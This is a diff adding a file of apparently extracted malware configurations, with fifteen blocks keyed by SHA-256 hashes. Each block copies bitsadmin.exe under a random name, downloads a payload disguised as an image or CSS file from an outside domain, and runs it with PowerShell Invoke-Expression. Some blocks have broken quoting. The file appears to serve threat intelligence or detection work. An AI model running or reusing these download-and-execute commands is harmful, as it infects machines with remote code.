@@ -1,0 +1,97 @@
+// ---------------- 1dba2064e7290c1896d560ff266a18cb6bd9b7e82aad50ddcbe2afde3e43c53e -----------------------//
+regex="([\^\*\*\#\(\(\@\!\)])"
+path="C:\ProgramData\Norton\"
+runcommand="cmd /c copy /Z c:\Windows\SysWOW64\bitsadmin.exe %appdata%\WhZRIiim.exe"
+runcommand="%appdata%\WhZRIiim.exe /transfer QfhszX /download https://unequipoganador.com/ipol/03675480267/map.jpg %appdata%\map.jpg"
+runcommand="powershell.exe -c &{$YC="gc %appdata%\map.jpg| Out-String; Invoke-Expression $YC  }"
+
+// ---------------- 2cc33394a01bb3af0e48d0ccb71037c39f142fb22a7ed2ac40bc0860147da1a8 -----------------------//
+regex="([\@\)\#\*\(\*\!\^\(])"
+path="C:\ProgramData\Norton\"
+runcommand="cmd /c copy /Z c:\Windows\SysWOW64\bitsadmin.exe %appdata%\tronYt.exe"
+runcommand="%appdata%\tronYt.exe /transfer fYAwDF /download https://devopotamus.com/potal/03587420286/blank.css %appdata%\blank.css"
+runcommand="powershell.exe -c &{$AE="gc %appdata%\blank.css| Out-String; Invoke-Expression $AE  }"
+
+// ---------------- 06e5575f67113906effb3cdb8ea2f021f3bc5fad8d278d80eb3da943dc743c2d -----------------------//
+regex="([\)\*\^\(\(\!\*\#\@])"
+path="C:\ProgramData\Norton\"
+runcommand="cmd /c copy /Z c:\Windows\SysWOW64\bitsadmin.exe %appdata%\kAlsTdc.exe"
+runcommand="%appdata%\kAlsTdc.exe /transfer UaBgTb /download https://sapphireloading.com/sal/04913170280/logo.png %appdata%\logo.png"
+runcommand="powershell.exe -c &{$Pi="gc %appdata%\logo.png| Out-String; Invoke-Expression $Pi  }"
+
+// ---------------- 9b4dc4c27bbba4e9215b17cddfc80ee3581f76c8d8010ddee4c978fd2922c4f7 -----------------------//
+regex="([\(\*\)\!\*\(\@\^\#])"
+path="C:\ProgramData\Norton\"
+runcommand="cmd /c copy /Z c:\Windows\SysWOW64\bitsadmin.exe %appdata%\kYqoi.exe"
+runcommand="%appdata%\kYqoi.exe /transfer hgTrnk /download https://devopotamus.com/potal/01555200441/en.gif %appdata%\en.gif"
+runcommand="powershell.exe -c &{$GM="gc %appdata%\en.gif| Out-String; Invoke-Expression $GM  }"
+
+// ---------------- 9f1d77dacee045731ee5ff9539060528ce01c5db3f7b99b4f7ac68687beab966 -----------------------//
+regex="([\!\(\(\)\^\@\*\#\*])"
+path="C:\ProgramData\Norton\
+runcommand="cmd /c copy /Z c:\Windows\SysWOW64\bitsadmin.exe %appdata%\fPRmWowk.exe
+runcommand="%appdata%\fPRmWowk.exe /transfer oQYvHU /download https://alkwti.com/aliwona/TMSRLL61M43B796B/en.jpg %appdata%\en.jpg
+runcommand="powershell.exe -c &{$Cs="gc %appdata%\en.jpg| Out-String; Invoke-Expression $Cs  }
+
+// ---------------- 15a61df21dc514fc4e935bb1e267134265f2c70aa167f03389c4f1a5b5a750d9 -----------------------//
+regex="([\(\*\^\)\*\@\!\(\#])"
+path="C:\ProgramData\Norton\"
+runcommand="cmd /c copy /Z c:\Windows\SysWOW64\bitsadmin.exe %appdata%\PfVQU.exe"
+runcommand="%appdata%\PfVQU.exe /transfer gAFmYM /download https://innerearthartistry.com/nerea/03455910780/1x1.gif %appdata%\1x1.gif"
+runcommand="powershell.exe -c &{$va="gc %appdata%\1x1.gif| Out-String; Invoke-Expression $va  }"
+
+// ---------------- 28b811e737ec718f5c36cf05df89da00f48e4e088756e11564c15fe683702964 -----------------------//
+regex="([\)\(\!\*\^\#\(\@\*])"
+path="C:\ProgramData\Norton\
+runcommand="cmd /c copy /Z c:\Windows\SysWOW64\bitsadmin.exe %appdata%\KXPBM.exe
+runcommand="%appdata%\KXPBM.exe /transfer OpgpzU /download https://innerearthartistry.com/nerea/03756910273/1x1.gif %appdata%\1x1.gif
+runcommand="powershell.exe -c &{$pD="gc %appdata%\1x1.gif| Out-String; Invoke-Expression $pD  }
+
+// ---------------- 96bd66aedb565c6d29e60d7e7880047749abcd1cfa2d7b27f612b7b32038ede5 -----------------------//
+regex="([\(\!\*\*\(\)\^\@\#])"
+path="C:\ProgramData\Norton\"
+runcommand="cmd /c copy /Z c:\Windows\SysWOW64\bitsadmin.exe %appdata%\NOXGAdE.exe"
+runcommand="%appdata%\NOXGAdE.exe /transfer VDCNqY /download https://sapphireloading.com/sal/07501560150/maps.jpg %appdata%\maps.jpg"
+runcommand="powershell.exe -c &{$rY="gc %appdata%\maps.jpg| Out-String; Invoke-Expression $rY  }"
+
+// ---------------- 147e1d26153de7bd5033968d64104bb9df597d1913f237f4f5b172f06414b775 -----------------------//
+regex="([\@\^\)\*\#\(\!\(\*])"
+path="C:\ProgramData\Norton\
+runcommand="cmd /c copy /Z c:\Windows\SysWOW64\bitsadmin.exe %appdata%\tzRIng.exe
+runcommand="%appdata%\tzRIng.exe /transfer dRfWyZ /download https://sapphireloading.com/sal/02298410644/blank.gif %appdata%\blank.gif
+runcommand="powershell.exe -c &{$Jo="gc %appdata%\blank.gif| Out-String; Invoke-Expression $Jo  }
+
+// ---------------- 698cd771502d967e9921d2b0c2d3bb7787554f3b056c967991965270e9707e25 -----------------------//
+regex="([\(\*\!\*\(\)\^\@\#])"
+path="C:\ProgramData\Norton\"
+runcommand="cmd /c copy /Z c:\Windows\SysWOW64\bitsadmin.exe %appdata%\zGOSMzh.exe"
+runcommand="%appdata%\zGOSMzh.exe /transfer pNnZQz /download https://innerearthartistry.com/nerea/01578300210/it.png %appdata%\it.png"
+runcommand="powershell.exe -c &{$Yr="gc %appdata%\it.png| Out-String; Invoke-Expression $Yr  }"
+
+// ---------------- 49904fa43dc24c2cbfe64c7089edc9805ce6ce93e4ff240663a6308ec5efe462 -----------------------//
+regex="([\@\(\)\!\*\(\^\*\#])"
+path="C:\ProgramData\Norton\"
+runcommand="cmd /c copy /Z c:\Windows\SysWOW64\bitsadmin.exe %appdata%\rmYXJdOL.exe"
+runcommand="%appdata%\rmYXJdOL.exe /transfer jSGeYV /download https://sapphireloading.com/sal/08924551008/it.css %appdata%\it.css"
+runcommand="powershell.exe -c &{$Af="gc %appdata%\it.css| Out-String; Invoke-Expression $Af  }"
+
+// ---------------- a1bfd39eb6057b5797ca04c30d5ca65641585e72ecdfdd8e0c1ac24d126b4056 -----------------------//
+regex="([\^\#\*\)\!\*\(\@\(])"
+path="C:\ProgramData\Norton\
+runcommand="cmd /c copy /Z c:\Windows\SysWOW64\bitsadmin.exe %appdata%\nUpPg.exe"
+runcommand="%appdata%\nUpPg.exe /transfer YnoTxN /download https://innerearthartistry.com/nerea/BRNLSN65H44H501N/1x1.gif %appdata%\1x1.gif"
+runcommand="powershell.exe -c &{$fU="gc %appdata%\1x1.gif| Out-String; Invoke-Expression $fU  }"
+
+// ---------------- d1064ee3b5c35e19a703373e2e6554ba598a0b9d647d9c4da08331fe5964cba6 -----------------------//
+regex="([\^\(\*\!\@\#\)\(\*])"
+path=C:\ProgramData\Norton\"
+runcommand=cmd /c copy /Z c:\Windows\SysWOW64\bitsadmin.exe %appdata%\hobcd.exe"
+runcommand=%appdata%\hobcd.exe /transfer ScPxOQ /download https://innerearthartistry.com/nerea/02044200042/uk.gif %appdata%\uk.gif"
+runcommand=powershell.exe -c &{$fe=gc %appdata%\uk.gif| Out-String; Invoke-Expression $fe  }"
+
+// ---------------- f6cb2ffe73e87a5d0053ca599d203d3dbc187d65b434d4c7c649c51ba2689505 -----------------------//
+regex="([\(\(\#\*\!\@\^\*\)])"
+path="C:\ProgramData\Norton\"
+runcommand="cmd /c copy /Z c:\Windows\SysWOW64\bitsadmin.exe %appdata%\mvSS.exe"
+runcommand="%appdata%\mvSS.exe /transfer CThnbH /download https://sapphireloading.com/sal/04198100168/blank.gif %appdata%\blank.gif"
+runcommand="powershell.exe -c &{$Xb="gc %appdata%\blank.gif| Out-String; Invoke-Expression $Xb  }"
